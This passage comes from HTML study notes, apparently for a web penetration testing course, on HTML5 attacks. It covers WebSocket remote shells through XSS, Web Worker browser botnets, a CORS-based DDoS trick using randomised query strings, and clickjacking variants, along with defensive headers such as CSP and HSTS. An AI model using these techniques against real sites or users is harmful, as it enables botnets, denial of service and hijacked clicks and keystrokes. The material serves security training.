+</code></pre><p id="723e6163-ad7e-4e13-8a52-1851eeea4330" class="">If the implementation uses the unencrypted channel, we have a MiTM issue whereby, anybody on the network can see and manipulate the traffic.</p><h3 id="996ac51e-4855-4160-889a-43384003c7ce" class=""><strong>Remote Shell</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#remote-shell"></a></strong></h3><p id="ab211e87-ea6f-42b1-a98e-0c303d5f452b" class="">If we are able to execute JavaScript code on the victim browser, by either exploiting an XSS flaw or tricking the victim into visiting a malicious website, we could conveniently establish a full Web Socket connection and, as a result, have a Remote Shell active until the window/tab is closed.</p><h3 id="d20ef4d0-503c-4ab6-bc77-b53c4f7053e4" class=""><strong>Network Reconnaissance</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#network-reconnaissance"></a></strong></h3><p id="d120dd3b-7423-439f-a80c-586d0564aa47" class="">Nice tools to test both scenarios JS-Recon</p><p id="56b9d187-cb5e-4c4e-a7a0-356884bb0f09" class="">→ https://web.archive.org/web/20120313125925/http:/www.andlabs.org/tools/jsrecon/jsrecon.html</p><h2 id="40659708-d0cb-485e-af8e-3b5d5ccc5708" class=""><strong>Web Workers Attack Scenarios</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#web-workers-attack-scenarios"></a></strong></h2><p id="2a2906f4-c790-4ab7-ba14-2d4694ab714c" class="">→ http://www.w3.org/TR/workers/</p><p id="8e11a870-e329-4dcd-aa76-5d4fd470e7e5" class="">Web workers is the solution, introduced by HTML5, to allow thread-like operations within web browsers. it allows most modern browser to run Javascript in the background.</p><p id="1c5c2dc9-ce37-4dcb-9a2b-baa82c616993" class="">Methods like <strong>setTimeout, setInterval or even XMLHttpRequest</strong>, provided a valid solution to achieving parallelism by using thread-like messaging.</p><p id="7c65e4c9-fcf6-4fd0-ab89-6391f35adcc2" class="">Two types:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8e9bfb41-249a-47a0-9195-e21c70ba9526" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Dedicated Web Workers: http://www.w3.org/TR/workers/#dedicated-workers-and-the-worker-interface
+Shared Web Workers: http://www.w3.org/TR/workers/#shared-workers-and-the-sharedworker-interface
+</code></pre><ul id="491b9cb6-e2a0-4d84-807e-c7d15b3baae4" class="bulleted-list"><li style="list-style-type:disc">A dedicated workers can only be accessed through the script that created it, while the shared one can be accessed by any script from the same domain.</li></ul><ul id="454df48c-e3d0-408f-a660-d4b0516331cb" class="bulleted-list"><li style="list-style-type:disc">It did not introduce new threats, but increased the performance and feasibility of the attack.</li></ul><h3 id="557890f1-3ee7-4794-bf3d-297b8606a19b" class=""><strong>Browser-Based Botnet</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#browser-based-botnet"></a></strong></h3><p id="1b996dca-35d2-4bf2-98ec-05315cd65945" class="">We can run the Javascript code on all the browsers that support the features the bot uses. This also includes any OS that can run a browser, even on televisions, gaming console, etc.</p><p id="a038e9c0-0af9-481c-b987-8aacb76a967e" class="">Two stages:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="098b5544-72b0-4455-b2b7-4bf88270ae8c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- 1. Infect the victims: XSS, email spam, social engineering...
+- 2. Manage Persistence: the malicious code will work until the victim browser is closed.
+</code></pre><p id="03d1ffa8-99d7-4f71-9d4f-8705a820c90b" class="">Sometimes, implementing a game can help u keep the victim on the malicious page. If the game is both interactive and especially addictive, the user may remain online the entire day.</p><p id="ee4264cc-785e-49b6-bcde-6598e83360a6" class="">With an HTML5 Botnet, some of the possibel attacks that can be performed are:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="07c00840-d0ea-41fb-a295-97350e755610" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Email Spam
+Distributed Password Cracking
+DDoS Attacks
+Phishing
+Data Mining
+Intranet Reconnaissance
+</code></pre><h3 id="c19bdd81-5aad-4821-a71c-4906d99c3632" class=""><strong>Distributed Password Cracking</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#distributed-password-cracking"></a></strong></h3><ul id="d2b9c9b4-320c-43e8-a49f-efcd390ea6ea" class="bulleted-list"><li style="list-style-type:disc">Ravan</li></ul><p id="41d6f26e-3199-471d-bc37-0c2ed950daca" class="">→ http://web.archive.org/web/20160315031218/http:/www.andlabs.org/tools/ravan.html</p><blockquote id="bcc065a9-ad0f-4073-91ce-454aa5eb721e" class="">A system based on WebWorkers to perform password cracking of MD5, SHA1, SHA256, SHA512 hashes.</blockquote><h3 id="868ce0f4-1a09-4381-bea8-976b1ccee950" class=""><strong>WebWorkers + CORS - DDoS Attacks</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#webworkers--cors---ddos-attacks"></a></strong></h3><p id="eb2de6c3-3d5c-43a0-bab1-8f98a27dd961" class="">Adding CORS we could generate a large number of GET/POST requests to a remote website. We would be using COR requests to perform a DDoS attack.</p><ul id="953308d0-076b-46d8-b999-1ef0869397be" class="bulleted-list"><li style="list-style-type:disc">We dont care if the response is blocked or wrong, we care about sending as many requests as possible.</li></ul><p id="7d91457d-eddd-485b-92ee-d8357cd34d74" class="">To bypass the CORS limitation, add facke parameters in the query-string. It will force the browser to transform each request, therefore identifying it as unique:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ffcb4f02-480e-48d0-a24e-dd2d27c883c2" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">http://victim.site/dossable.php?search=X
+x = use random values here
+</code></pre><h2 id="27e79557-b6ba-4c09-be9e-6498b34e6243" class=""><strong>Security Measures</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#security-measures"></a></strong></h2><h3 id="8001cece-9182-42c7-bca9-400500d470bd" class=""><strong>Security Headers: X-XSS-Protection</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#security-headers-x-xss-protection"></a></strong></h3><p id="5f9114aa-ff06-4e06-a87a-0b114428dfeb" class="">To protect against Reflected XSS attacks</p><h3 id="1c7cf318-86cd-43f0-ab95-6e8185921c45" class=""><strong>Security Headers: X-Frame-Options</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#security-headers-x-frame-options"></a></strong></h3><p id="38b22d6c-3a4c-4322-8430-b65c25cc5fac" class="">Prevent Clickjacking</p><ul id="ef7d9c5f-6ba9-48d0-b1e5-c4865f43f2ea" class="bulleted-list"><li style="list-style-type:disc">This header introduced a way For the server to instruct the browser on wheter to display the transmitted content in frame of other web pages.</li></ul><p id="033069b6-e95f-406d-86d6-ca7a33daf706" class="">Syntax:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="af38c8fd-16d4-4660-8937-ef5af257ff10" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">X-Frame-Options: value
+
+# DENY = the page cannot be displayed in a frame, regardless of the site attempting to do so.
+# SAMEORIGIN = The page can only be displayed in a frame on the same origin as the page itself.
+# ALLOW-FROM URI = The page can only be displayed in a frame on the specific origin.
+</code></pre><h3 id="f64ac4df-bdf1-453b-8e83-beae32f27d51" class=""><strong>Security Headers: Strict-Transport-Security (HSTS)</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#security-headers-strict-transport-security-hsts"></a></strong></h3><p id="4710f11f-59af-405f-abde-575d87b78a6d" class="">→ http://tools.ietf.org/html/rfc6797</p><p id="472c6a7b-b9de-443a-a0a0-67a0967129af" class="">It allows a server to declare itself accessible only via secure connections. It also allows For users to be able to direct their user agents to interact with given sites over secure connections only.</p><p id="0b992583-f450-4a9f-9d80-0ba51f114356" class="">To enable this mechanism, the response header <strong>Strict-Transport-Security</strong> is required. (its not supported by all vendors.</p><p id="96ecd713-0b39-40bf-8810-b7131d8f79bd" class="">→ http://caniuse.com/#feat=stricttransportsecurity</p><p id="3461cec7-f036-4efe-ab10-88b0815cbdc7" class="">Syntax:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="201fdd48-da4c-4b3d-b208-a9e5df073e94" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Strict-Transport-Security: max-age=&lt;delta-seconds&gt;; includeSubDomains
+
+# One year in cache is &#x27;max-age=31536000&#x27; (Optional)
+# While to remove or &#x27;not cache&#x27; is max-age=0
+</code></pre><h3 id="ae3c6611-5fec-44d1-8e51-c6bde0faa506" class=""><strong>Security Headers: X-Content-Type-Options</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#security-headers-x-content-type-options"></a></strong></h3><p id="30b02853-c015-4678-92ac-9a53a71086cd" class="">To indicate a specific resource, web server use the response header Content-Type which contains a standard MIME type( text/html, image/png, etc) with some optional parameters (character set)</p><p id="191ee01d-2f61-47fb-b9d1-1d279d030627" class="">→ attack scenarios - http://blog.fox-it.com/2012/05/08/mime-sniffing-feature-or-vulnerability/</p><p id="ec679c8e-9adf-4bb8-8a97-c9692cd2a845" class="">The most common is <strong>Content Sniffing XSS</strong></p><p id="4789bcbe-86f9-4108-8a6d-6a9bb6db85e1" class="">→ http://www.adambarth.com/papers/2009/barth-caballero-song.pdf</p><ul id="09f76cea-d0f2-473a-979f-1d5d2d3939ba" class="bulleted-list"><li style="list-style-type:disc">This header instructs the browser to <strong>not guess</strong> the content type of the resource and trust of the Content-Type header.</li></ul><p id="a260ad55-956f-45bd-bbf3-75fed481bae5" class="">Syntax:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="802cb910-72e3-4cbf-81f8-d65de75f71ef" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">X-Content-Type-Options: nosniff
+// only works on IE and Chrome
+</code></pre><h3 id="e982aa0f-3e92-471d-b1df-eb932af11235" class=""><strong>Security Headers: Content Security Policy (CSP)</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#security-headers-content-security-policy-csp"></a></strong></h3><p id="2fab489c-5b30-4a1f-9dce-fa594c590601" class="">Its a defende mechanism that can significantly reduce the risk impact of a broad class of content injection vulnerabilities. These include <strong>XSS</strong> and <strong>UI Redressing</strong> in modern browsers.</p><p id="147b1930-012e-493a-b071-3b00e099a834" class="">Headers adopted:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="25e93680-b85d-41c2-a5e1-27232a3d5e94" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">X-Content-Security-Policy and X-WebKit-CSP
+</code></pre><p id="cd48fdc4-2b85-49b9-ad51-0c150c8134cf" class="">CSP uses a collection of directives in order to define a specific set of whitelisted sources of trusted content</p><p id="16b4164e-634e-4f34-af2c-747d3aabb21c" class="">→ http://www.w3.org/TR/CSP/#directives</p><p id="ff2411ad-17ff-4972-a7d0-9e09378949a5" class="">The most common is script-src = http://www.w3.org/TR/CSP/#script-src:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8a6c98d0-229b-452d-9884-c324c7b5344f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"> Content-Security-Policy: script-src &#x27;self&#x27; https://other.web.site
+
+//                   Directive Name      Values
+// 1 Defines which scripts the protected resource can execute
+// 2 the allowed sources of scripts
+</code></pre><p id="3acbe924-20ac-4b59-9e68-1037bb1eeb9d" class="">Directives work in default-allow mode. This simply means that if a specific directive does not have a policy defined, then its equal to ‘*’; thus, every source is a valid source.</p><p id="845ead58-1dc1-449e-9120-7f17ccb08bc7" class="">The <strong>default-src</strong> directive will be applied to all the unspecified directives:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="52d9f4f3-fa73-4a0a-9859-1462f74a6746" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Content-Security-Policy: default-src &#x27;self&#x27;
+</code></pre><p id="f776fed7-9861-4334-993f-1603e68cf8de" class="">With CSP, its also possible to deny resources. For example, if the web app does not need plugins or to be framed, then the policy can be enriched as follow:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7cd12fca-d6bc-4b50-bc56-b4d02bf8c00f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Content-Security-Policy: default-src https://my.web.site;
+object-src &#x27;none&#x27;; frame-src &#x27;none&#x27;
+// &#x27;none&#x27; returns an empty set For the allowed sources
+</code></pre><p id="e9d3cd84-e3a4-4fea-afca-bacfc615ecdb" class="">CSP specification: http://www.w3.org/TR/CSP/</p><p id="4b6e04c4-34e9-48a6-8dd3-4222f14bcb7c" class="">Defines the following list directives:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="37f283d0-6559-48e6-9bd9-40466a10c2ea" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">default-src
+script-src
+object-src
+style-src
+img-src
+media-src
+frame-src
+font-src
+connect-src
+report-uri // reporting feature
+sandbox    // optional
+</code></pre><p id="ab994a53-572b-4767-a567-3ad644b1a5ef" class="">There are four keywords that are also allowed:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e18ac4bb-57a4-49fd-8b98-02b69d4816d9" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">none - no sources
+self - current origin, but not its subdomains
+unsafe-inline - allows inline JavaScript and CSS
+unsafe-eval - allows text-to-JavaScript sinks like &#x27;eval, alert, setTimeout...&#x27;
+
+// These keywords must be used with single-quotes, otherwise they refer to server named none, self, etc
+</code></pre><p id="cd0bebc6-cb41-4596-aa8f-750b90f4c0de" class="">Report violations mechanism:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e119d0c9-53f0-4fe1-b899-4b4350b1226b" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Content-Security-Policy: default-src &#x27;self&#x27;; report-uri /csp_report;
+// once a violation is detected, the browser will perform a POST request to the path specified, sending a JSON object, similar to the one on the next slide.
+</code></pre><p id="38f87524-57e9-4d87-b3ee-64311e6f1e41" class="">Example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="adb94546-4ef0-4ef7-8e29-1b39a5be9778" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">{
+  &quot;csp-report&quot;: {
+    &quot;document-uri&quot;:&quot;http://my.web.site/page.html&quot;,
+    &quot;referrer&quot;:&quot;http://hacker.site/&quot;,
+    &quot;blocked-uri&quot;:&quot;https://hacker.site/xss_test.js&quot;,
+    &quot;violated-directive&quot;:&quot;script-src &#x27;self&#x27;&quot;,
+    &quot;original-policy&quot;:&quot;script-src &#x27;self&#x27;; report-uri http://my.web.site/csp_report&quot;
+  }
+}
+</code></pre><h3 id="9bf0dfc7-f926-4c7b-9a46-87a79c77270b" class=""><strong>CSP Playground</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#csp-playground"></a></strong></h3><p id="82a4acfa-50f4-4982-a300-3fc1bd407c46" class="">To test CSP options</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="eca5cbce-3bef-4e95-b0c1-ce0497a81bcd" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">http://www.cspplayground.com/
+</code></pre><h2 id="dc551913-643d-4ee9-a63d-5f5010f1eae2" class=""><strong>UI Redressing - The x-Jacking Art</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#ui-redressing---the-x-jacking-art"></a></strong></h2><p id="be0ff00e-e8ab-4b23-b6e0-d1e90717e41e" class="">A category of attacks that aim to change visual elements in a user interface in order to conceal malicious activities.</p><p id="5caa5559-41b5-439f-ad46-e98716aada13" class="">Example such as:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="46c1c7b5-1827-4812-889a-9e711ea8c976" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Overlaying a visible button with an invisible one
+- Changing the cursos position
+- Manipulating other elements in the user interface
+- Also known as ClickJacking, LikeJacking, StrokeJacking, FileJacking and others
+</code></pre><h3 id="8f0d1ba9-8819-4ff4-a96c-d4a9a27fed36" class=""><strong>ClickJacking</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#clickjacking"></a></strong></h3><p id="78eabdef-3d56-411d-b465-0b66227cf341" class="">This attack uses a nested iframe from a target website and a little bit of CSS magic.</p><p id="2954d7a2-331b-4f1d-97d8-4c6c21783b3d" class="">A submission button or whatever the attack chooses to trigger an action:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="98915f56-7832-4106-a5fd-5637ed7261f1" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">For example: **find willie**, when clicked it triggers the attack
+</code></pre><h3 id="c3cf2436-c3e9-4b65-be4a-53c2b70746da" class=""><strong>LikeJacking</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#likejacking"></a></strong></h3><p id="9810127f-135a-42f3-a260-c7700e35f6c8" class="">→ http://nakedsecurity.sophos.com/2010/05/31/facebook-likejacking-worm/</p><ul id="abec61b7-adc4-42bc-8f87-484153e6e97c" class="bulleted-list"><li style="list-style-type:disc">The target are social networks and their features.</li></ul><ul id="7a4ff0e2-123e-4ad1-a76b-a1c8abb782d2" class="bulleted-list"><li style="list-style-type:disc">THe likes are perceived as popularity and quality nowadays, so there is ways to buy likes to give the public this wrong perception</li></ul><h3 id="bc3980ef-4b9a-4ab7-b64a-b137f1b573f7" class=""><strong>StrokeJacking</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#strokejacking"></a></strong></h3><p id="d155f08f-520c-4b55-9eb8-713f803f3723" class="">→ http://seclists.org/fulldisclosure/2010/Mar/232</p><p id="15d7efc9-286c-4b61-bbfc-fa1b9ba3197c" class="">A technique to hijack keystrokes, is proof that UI Redressing is not only all about hijacking clicks.</p><p id="a163bb93-47bc-4ab5-bdb3-1aa8b74cdfe4" class="">Example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b1089570-8073-435e-8002-e319d58c6720" 